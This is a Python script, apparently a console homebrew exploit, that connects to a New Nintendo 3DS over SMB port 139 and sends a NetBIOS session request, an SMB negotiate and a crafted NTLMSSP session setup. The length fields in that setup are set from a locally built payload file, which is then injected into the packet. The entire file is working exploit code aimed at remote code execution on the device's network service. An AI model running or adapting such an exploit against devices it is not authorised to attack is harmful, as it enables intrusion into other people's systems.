import os
import sys
import string
import struct
import socket

def usage(code):
	print("  Usage: mhax.py <N3DS IP address> <N3DS SMB name> <USA/JPN/EUR>")
	exit(code)

if len(sys.argv) < 4:
	print("  Not enough arguments")
	usage(-1)

server_ip = sys.argv[1]
server_name = sys.argv[2]
region = sys.argv[3]

if region not in ["JPN", "EUR", "USA"]:
	print("  Unknown region " + region)
	usage(-2)

payload_filename = "out\\payload_" + region + ".bin"

if not os.path.isfile(payload_filename):
	os.system("make clean && make MHAX_VERSION=" + region)

if not os.path.isfile(payload_filename):
	print("  Couldn't generate " + payload_filename)
	usage(-3)

payload = open(payload_filename, "rb").read()
payload_len = len(payload)
	
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server_ip, 139))

server_name = server_name.ljust(15)[:15] + " "
out = [len(server_name) * 2]

for char in server_name:
	val = ord(char)
	out += [ord(string.ascii_uppercase[val >> 4]), ord(string.ascii_uppercase[val & 0x0f])]

server_name = bytes(out + [0])

s.send(b"\x81\x00\x00D" + server_name + b" EIEBFICACACACACACACACACACACACAAA\x00")
data = s.recv(1024)

print("received data:", data)

s.send(b"\x00\x00\x00/\xffSMBr\x00\x00\x00\x00\x18A\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08B\x00\x00\x01\x00\x00\x0c\x00\x02NT LM 0.12\x00")
data = s.recv(1024)

print("received data:", data)

s.send(b"\x00\x00\x00h\xffSMBs\x00\x00\x00\x00\x18A\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08B\x00\x00\x02\x00\x0c\xff\x00\x00\x00\x04A\n\x00\x01\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00T\x00\x00\x80-\x00NTLMSSP\x00\x01\x00\x00\x00\x05\x82\x88\xe2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00r\x17\x00\x00\x00\x0f\x00\x00\x00\x00\x00")
data = s.recv(1024)

print("received data:", data)

s.send(b"\x00\x00\x0c\xee\xffSMBs\x00\x00\x00\x00\x18A\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4)\xd6.\x03\x00\x0c\xff\x00\x00\x00\x04A\n\x00\x01\x00\x00\x00\x00\x00\xae\x0c\x00\x00\x00\x00T\x00\x00\x80\xb3\x0cNTLMSSP\x00\x03\x00\x00\x00\x18\x00\x18\x00@\x00\x00\x00\x1c\x00\x1c\x00X\x00\x00\x00" + struct.pack("<HH", payload_len, payload_len) + b"\x9e\x00\x00\x00\x08\x00\x08\x00t\x00\x00\x00\x12\x00\x12\x00|\x00\x00\x00\x10\x00\x10\x00\x8e\x00\x00\x00\x15\x82\x8a\xe0\xec%)i\x1d^\xb5t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00n\x9bl\xe2\xf4\xb5\xbe\xbd?\xb4\x7f#X\xdf\xb2y\x01\xa3\x9fZ\\\xb0\x0e\xa2\x00\x00\x00\x00U\x00s\x00e\x00r\x00L\x00O\x00C\x00A\x00L\x00H\x00O\x00S\x00T\x00\x17\x87l\xc8I9\xcc\x89&h/\x90\xba\x8a=E" + payload + b"\x00\x00\x00\x00\x00")

s.close()
